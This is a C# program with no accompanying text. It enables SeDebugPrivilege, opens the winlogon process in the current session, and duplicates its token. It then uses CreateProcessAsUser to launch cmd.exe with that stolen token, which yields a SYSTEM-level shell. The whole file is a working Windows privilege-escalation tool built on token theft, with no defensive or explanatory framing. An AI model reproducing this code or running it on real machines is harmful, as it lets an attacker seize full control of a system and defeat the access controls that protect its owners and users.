using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

class Program
{
    const uint TOKEN_DUPLICATE = 0x0002;
    const uint TOKEN_QUERY = 0x0008;
    const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
    const uint MAXIMUM_ALLOWED = 0x02000000;
    const int SecurityImpersonation = 2;
    const int TokenPrimary = 1;
    const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;

    [StructLayout(LayoutKind.Sequential)]
    struct LUID { public uint LowPart; public int HighPart; }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct TOKEN_PRIVILEGES { public int PrivilegeCount; public LUID Luid; public uint Attributes; }

    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessAsUser(
        IntPtr hToken,
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    static void Main()
    {
        OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out IntPtr hMyToken);
        LookupPrivilegeValue(null, "SeDebugPrivilege", out LUID luid);
        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES { PrivilegeCount = 1, Luid = luid, Attributes = SE_PRIVILEGE_ENABLED };
        AdjustTokenPrivileges(hMyToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        CloseHandle(hMyToken);

        int sessionId = Process.GetCurrentProcess().SessionId;
        Console.WriteLine($"Current Session: {sessionId}");

        var procs = Process.GetProcessesByName("winlogon");
        Process winlogon = null;
        foreach (var p in procs) {
            if (p.SessionId == sessionId) {
                winlogon = p;
                break;
            }
        }

        if (winlogon == null) {
            Console.WriteLine("Could not find winlogon for this session");
            return;
        }

        Console.WriteLine($"Found winlogon PID: {winlogon.Id}");

        IntPtr hProc = OpenProcess(0x1000 | 0x0400, false, winlogon.Id);
        if (hProc == IntPtr.Zero) hProc = OpenProcess(0x0400, false, winlogon.Id);
        
        if (hProc == IntPtr.Zero) {
            Console.WriteLine($"OpenProcess failed: {Marshal.GetLastWin32Error()}");
            return;
        }

        if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, out IntPtr hToken))
        {
            if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out IntPtr hDup))
            {
                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                si.lpDesktop = "winsta0\\default";
                
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                
                bool result = CreateProcessAsUser(
                    hDup, 
                    "C:\\Windows\\System32\\cmd.exe", 
                    null, 
                    IntPtr.Zero, 
                    IntPtr.Zero, 
                    false, 
                    0, 
                    IntPtr.Zero, 
                    null, 
                    ref si, 
                    out pi);
                    
                if (result) {
                    Console.WriteLine($"Success! Spawned PID: {pi.dwProcessId}");
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                } else {
                    Console.WriteLine($"CreateProcessAsUser failed: {Marshal.GetLastWin32Error()}");
                }
                CloseHandle(hDup);
            }
            CloseHandle(hToken);
        }
        CloseHandle(hProc);
    }
}
